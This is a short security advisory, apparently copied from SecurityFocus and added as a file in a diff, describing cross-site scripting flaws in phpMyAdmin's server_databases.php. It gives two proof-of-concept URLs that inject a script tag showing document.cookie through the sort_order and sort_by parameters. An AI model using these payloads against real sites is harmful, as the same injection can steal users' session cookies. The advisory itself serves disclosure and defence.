@@ -1,0 +1,8 @@
+source: http://www.securityfocus.com/bid/15196/info
+ 
+phpMyAdmin is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+ 
+An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks. 
+
+http://www.example/com/server_databases.php?lang=en-iso-8859-1&server=1&sort_by=db_name&sort_order="><script>alert(document.cookie)</script>
+http://www.example/com/server_databases.php?lang=en-iso-8859-1&server=1&sort_by="><script>alert(document.cookie)</script> 
